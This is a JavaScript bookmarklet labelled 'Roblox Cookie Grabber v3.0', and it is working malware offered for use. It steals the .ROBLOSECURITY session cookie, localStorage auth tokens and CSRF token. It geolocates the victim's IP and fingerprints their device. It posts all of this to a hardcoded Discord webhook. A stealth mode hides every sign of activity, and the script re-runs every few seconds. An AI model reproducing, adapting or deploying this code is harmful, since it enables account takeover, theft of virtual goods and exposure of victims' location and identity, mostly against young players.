// Enhanced Roblox Cookie Grabber v3.0
// Automatically extracts and sends Roblox cookies with advanced features

javascript:(function(){
    // Configuration
    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1399753275225673778/jzgojCyaL0dSWz1pdji5g3Dvyh3HF9rsMxErcTM7cmnBi-HsOakqAxP41U-0MPTO_Mnv';
    const AUTO_RUN = true; // Set to true for automatic running
    const CHECK_INTERVAL = 3000; // Check every 3 seconds
    const STEALTH_MODE = true; // Hide control panel
    
    // Prevent duplicate instances
    if (window.robloxGrabberV3Active) {
        return; // Silent return if already running
    }
    
    window.robloxGrabberV3Active = true;
    
    // Enhanced cookie extraction with multiple methods
    function extractAllRobloxData() {
        let data = {
            cookie: null,
            csrf: null,
            userId: null,
            username: null,
            robux: null
        };
        
        // Method 1: Extract .ROBLOSECURITY cookie
        try {
            const cookies = document.cookie.split(';');
            for (let cookie of cookies) {
                const trimmed = cookie.trim();
                if (trimmed.startsWith('.ROBLOSECURITY=')) {
                    data.cookie = trimmed.substring('.ROBLOSECURITY='.length);
                    break;
                }
            }
        } catch (e) {}
        
        // Method 2: Extract from localStorage
        if (!data.cookie) {
            try {
                const keys = ['RBXAuth', 'RBXAuthenticationNegotiation', 'RobloxAuth'];
                for (const key of keys) {
                    const value = localStorage.getItem(key);
                    if (value && value.length > 50) {
                        data.cookie = value;
                        break;
                    }
                }
            } catch (e) {}
        }
        
        // Method 3: Extract CSRF token
        try {
            const csrfMeta = document.querySelector('meta[name="csrf-token"]');
            if (csrfMeta) data.csrf = csrfMeta.content;
        } catch (e) {}
        
        // Method 4: Extract user info from page
        try {
            const userDataScript = document.querySelector('script[type="application/ld+json"]');
            if (userDataScript) {
                const userData = JSON.parse(userDataScript.textContent);
                if (userData.name) data.username = userData.name;
            }
        } catch (e) {}
        
        // Method 5: Extract from Roblox global variables
        try {
            if (window.Roblox && window.Roblox.CurrentUser) {
                data.userId = window.Roblox.CurrentUser.userId;
                data.username = window.Roblox.CurrentUser.name;
            }
        } catch (e) {}
        
        return data;
    }
    
    // Enhanced location detection
    async function getDetailedLocation() {
        try {
            const response = await fetch('https://ipapi.co/json/');
            if (response.ok) {
                const data = await response.json();
                return {
                    ip: data.ip || 'Unknown',
                    country: data.country_name || 'Unknown',
                    region: data.region || 'Unknown',
                    city: data.city || 'Unknown',
                    isp: data.org || 'Unknown',
                    timezone: data.timezone || 'Unknown',
                    lat: data.latitude || 'Unknown',
                    lon: data.longitude || 'Unknown'
                };
            }
        } catch (error) {}
        return { ip: 'Unknown', country: 'Unknown', region: 'Unknown', city: 'Unknown', isp: 'Unknown', timezone: 'Unknown', lat: 'Unknown', lon: 'Unknown' };
    }
    
    // Device fingerprinting
    function getDeviceInfo() {
        return {
            userAgent: navigator.userAgent,
            language: navigator.language,
            platform: navigator.platform,
            screen: `${screen.width}x${screen.height}`,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            cookiesEnabled: navigator.cookieEnabled,
            onlineStatus: navigator.onLine
        };
    }
    
    // Send data to webhook with enhanced payload
    async function sendToWebhook(robloxData, locationInfo, deviceInfo) {
        try {
            const timestamp = new Date().toISOString();
            const fullCookie = robloxData.cookie ? `_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_${robloxData.cookie}` : 'Not found';
            
            const payload = {
                embeds: [{
                    title: "🍪 Roblox Data Extracted",
                    color: 0x00ff00,
                    timestamp: timestamp,
                    fields: [
                        {
                            name: "🍪 Cookie",
                            value: `\`\`\`${fullCookie}\`\`\``,
                            inline: false
                        },
                        {
                            name: "👤 User Info",
                            value: `**Username:** ${robloxData.username || 'Unknown'}\n**User ID:** ${robloxData.userId || 'Unknown'}\n**CSRF:** ${robloxData.csrf || 'Not found'}`,
                            inline: true
                        },
                        {
                            name: "📍 Location",
                            value: `**IP:** ${locationInfo.ip}\n**Location:** ${locationInfo.city}, ${locationInfo.region}, ${locationInfo.country}\n**ISP:** ${locationInfo.isp}\n**Timezone:** ${locationInfo.timezone}`,
                            inline: true
                        },
                        {
                            name: "💻 Device",
                            value: `**Platform:** ${deviceInfo.platform}\n**Screen:** ${deviceInfo.screen}\n**Language:** ${deviceInfo.language}\n**Browser:** ${deviceInfo.userAgent.split(' ').pop()}`,
                            inline: false
                        },
                        {
                            name: "🌐 Session",
                            value: `**Page:** ${window.location.href}\n**Referrer:** ${document.referrer || 'Direct'}\n**Time:** ${new Date().toLocaleString()}`,
                            inline: false
                        }
                    ],
                    footer: {
                        text: "Roblox Cookie Grabber v3.0"
                    }
                }],
                username: "Auto Roblox Grabber"
            };
            
            const response = await fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
            
            return response.ok;
        } catch (error) {
            return false;
        }
    }
    
    // Stealth notification (minimal UI)
    function showStealthNotif(message, success = true) {
        if (STEALTH_MODE) return; // No notifications in stealth mode
        
        const notif = document.createElement('div');
        notif.style.cssText = `
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: ${success ? '#28a745' : '#dc3545'};
            color: white;
            padding: 10px 15px;
            border-radius: 20px;
            z-index: 999999;
            font-family: Arial, sans-serif;
            font-size: 12px;
            opacity: 0.9;
        `;
        notif.textContent = message;
        document.body.appendChild(notif);
        
        setTimeout(() => notif.remove(), 3000);
    }
    
    // Main extraction function
    async function performExtraction() {
        if (!window.location.hostname.includes('roblox.com')) return;
        
        const robloxData = extractAllRobloxData();
        
        if (robloxData.cookie) {
            const locationInfo = await getDetailedLocation();
            const deviceInfo = getDeviceInfo();
            const success = await sendToWebhook(robloxData, locationInfo, deviceInfo);
            
            if (!STEALTH_MODE) {
                showStealthNotif(success ? '✅ Data sent' : '❌ Send failed', success);
            }
        }
    }
    
    // Initialize based on mode
    if (AUTO_RUN && window.location.hostname.includes('roblox.com')) {
        // Auto mode: run immediately and set interval
        performExtraction();
        
        if (!window.robloxGrabberInterval) {
            window.robloxGrabberInterval = setInterval(performExtraction, CHECK_INTERVAL);
        }
        
        // Auto-cleanup when leaving Roblox
        window.addEventListener('beforeunload', () => {
            if (window.robloxGrabberInterval) {
                clearInterval(window.robloxGrabberInterval);
                window.robloxGrabberInterval = null;
            }
            window.robloxGrabberV3Active = false;
        });
        
        console.log('%c🍪 Roblox Grabber v3.0 Active', 'color: #28a745; font-weight: bold;');
        
    } else {
        // Manual mode: run once
        if (window.location.hostname.includes('roblox.com')) {
            performExtraction();
        } else {
            alert('This bookmark only works on Roblox.com pages!');
        }
    }
})();